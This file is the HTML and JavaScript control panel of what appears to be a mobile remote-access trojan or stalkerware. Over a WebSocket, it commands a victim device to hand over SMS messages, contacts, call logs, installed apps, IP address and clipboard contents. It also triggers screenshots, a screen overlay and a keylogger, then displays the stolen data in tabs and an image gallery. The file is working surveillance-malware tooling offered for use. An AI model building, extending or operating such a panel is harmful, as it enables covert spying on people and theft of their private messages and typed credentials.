<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Device Control</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: #0d0d0d;
            color: #eee;
            display: flex;
            height: 100vh;
        }

        /* --- Sidebar --- */
        .sidebar {
            width: 70px;
            background: #111;
            padding: 20px 10px;
            box-sizing: border-box;
            display: flex;
            flex-direction: column;
            gap: 25px;
            border-right: 1px solid #222;
        }

        .sidebar button {
            width: 100%;
            aspect-ratio: 1 / 1;
            background: #1a1a1a;
            border: none;
            border-radius: 12px;
            color: #ccc;
            cursor: pointer;
            font-size: 18px;
            transition: 0.2s;
        }

        .sidebar button:hover {
            background: #3a3a3a;
            color: #fff;
        }

        /* --- Main Content --- */
        .main {
            flex: 1;
            display: flex;
            flex-direction: column;
        }

        /* Tabs */
        .tabs {
            display: flex;
            background: #111;
            border-bottom: 1px solid #222;
        }

        .tab {
            padding: 14px 20px;
            cursor: pointer;
            color: #999;
            border-bottom: 2px solid transparent;
            transition: 0.2s;
        }

        .tab.active {
            color: #fff;
            border-bottom: 2px solid #00adee;
        }

        /* Panels */
        .panel {
            display: none;
            padding: 20px;
            overflow-y: auto;
            flex: 1;
        }

        .panel.active {
            display: block;
        }

        /* Logs / SMS / Contacts / Etc. */
        pre {
            background: #1a1a1a;
            padding: 15px;
            border-radius: 10px;
            white-space: pre-wrap;
        }

        /* Screenshot Grid */
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
            gap: 15px;
        }

        .grid img {
            width: 100%;
            border-radius: 10px;
            cursor: pointer;
            transition: 0.2s;
        }

        .grid img:hover {
            transform: scale(1.03);
        }

        /* Modal */
        #imageModal {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.85);
            display: none;
            justify-content: center;
            align-items: center;
            padding: 40px;
            box-sizing: border-box;
        }

        #imageModal.show {
            display: flex;
        }

        #imageModal img {
            max-width: 90%;
            max-height: 90%;
            border-radius: 10px;
        }

        #modalClose {
            position: absolute;
            top: 20px;
            right: 30px;
            font-size: 26px;
            cursor: pointer;
            color: #fff;
        }

        #modalDownload {
            position: absolute;
            top: 20px;
            right: 90px;
            font-size: 20px;
            padding: 8px 14px;
            background: #00adee;
            color: #fff;
            border-radius: 8px;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <!-- ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ SIDEBAR (Sidebar 1) ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ -->
    <div class="sidebar">
        <button onclick="sendCmd('fetch-logs')">üìÑ</button>
        <button onclick="sendCmd('fetch-sms')">üí¨</button>
        <button onclick="sendCmd('fetch-contacts')">üë•</button>
        <button onclick="sendCmd('fetch-calllogs')">üìû</button>
        <button onclick="sendCmd('fetch-apps')">üì¶</button>
        <button onclick="sendCmd('take-screenshot')">üì∏</button>
        <button onclick="sendCmd('overlay')">üü©</button>

        <!-- Missing Old Buttons (Restored) -->
        <button onclick="sendCmd('fetch-ip')">üåê</button>
        <button onclick="sendCmd('fetch-clip')">üìã</button>
        <button onclick="sendCmd('start_keylog')">‚è∫</button>
        <button onclick="sendCmd('stop_keylog')">‚èπ</button>
        <button onclick="sendCmd('fetch_keylog')">‚å®Ô∏è</button>
        <button onclick="window.close()">‚ùå</button>
    </div>

    <!-- ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ MAIN CONTENT ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ -->
    <div class="main">

        <!-- Tabs -->
        <div class="tabs">
            <div class="tab active" data-panel="panelLogs">Logs</div>
            <div class="tab" data-panel="panelSms">SMS</div>
            <div class="tab" data-panel="panelContacts">Contacts</div>
            <div class="tab" data-panel="panelCalls">Calls</div>
            <div class="tab" data-panel="panelApps">Apps</div>
            <div class="tab" data-panel="panelScreenshots">Screenshots</div>
        </div>

        <!-- Panels -->
        <div id="panelLogs" class="panel active"><pre id="logOutput">Waiting...</pre></div>
        <div id="panelSms" class="panel"><pre id="smsOutput"></pre></div>
        <div id="panelContacts" class="panel"><pre id="contactsOutput"></pre></div>
        <div id="panelCalls" class="panel"><pre id="callsOutput"></pre></div>
        <div id="panelApps" class="panel"><pre id="appsOutput"></pre></div>
        <div id="panelScreenshots" class="panel">
            <div id="screenshotGrid" class="grid"></div>
        </div>

    </div>

    <!-- ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ IMAGE MODAL ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ -->
    <div id="imageModal">
        <span id="modalClose">‚úñ</span>
        <span id="modalDownload">Download</span>
        <img id="modalImage" src="">
    </div>

<script>
/* ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ
     WORKING WEBSOCKET (FROM YOUR OLD VERSION)
   ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ */
const wsProto = location.protocol === "https:" ? "wss://" : "ws://";
const ws = new WebSocket(wsProto + location.host);

/* Send Command */
function sendCmd(cmd) {
    ws.send(JSON.stringify({ cmd }));
}

/* Switch Tabs */
document.querySelectorAll(".tab").forEach(t => {
    t.onclick = () => {
        document.querySelectorAll(".tab").forEach(x => x.classList.remove("active"));
        document.querySelectorAll(".panel").forEach(p => p.classList.remove("active"));

        t.classList.add("active");
        document.getElementById(t.dataset.panel).classList.add("active");
    };
});

/* WebSocket Events */
ws.onopen = () => {
    console.log("Connected to server.");
};

ws.onmessage = (event) => {
    try {
        const data = JSON.parse(event.data);

        if (data.logs) {
            logOutput.textContent = data.logs;
        }
        if (data.sms) {
            smsOutput.textContent = JSON.stringify(data.sms, null, 2);
        }
        if (data.contacts) {
            contactsOutput.textContent = JSON.stringify(data.contacts, null, 2);
        }
        if (data.calls) {
            callsOutput.textContent = JSON.stringify(data.calls, null, 2);
        }
        if (data.apps) {
            appsOutput.textContent = JSON.stringify(data.apps, null, 2);
        }

        /* Screenshot Handler */
        if (data.screenshot) {
            addScreenshot(data.screenshot);
        }

    } catch (e) {
        console.error("Invalid WS message:", event.data);
    }
};

/* Screenshot rendering */
function addScreenshot(url) {
    const grid = document.getElementById("screenshotGrid");
    const img = document.createElement("img");
    img.src = url;
    img.onclick = () => openModal(url);
    grid.prepend(img);
}

/* Modal */
function openModal(url) {
    const modal = document.getElementById("imageModal");
    const img = document.getElementById("modalImage");
    const dl = document.getElementById("modalDownload");

    img.src = url;
    dl.onclick = () => downloadImage(url);

    modal.classList.add("show");
}

function downloadImage(url) {
    const a = document.createElement("a");
    a.href = url;
    a.download = "screenshot.png";
    a.click();
}

document.getElementById("modalClose").onclick = () => {
    const modal = document.getElementById("imageModal");
    const img = document.getElementById("modalImage");
    const dl = document.getElementById("modalDownload");

    modal.classList.remove("show");
    img.src = "";
    dl.onclick = null;
};
</script>

</body>
</html>
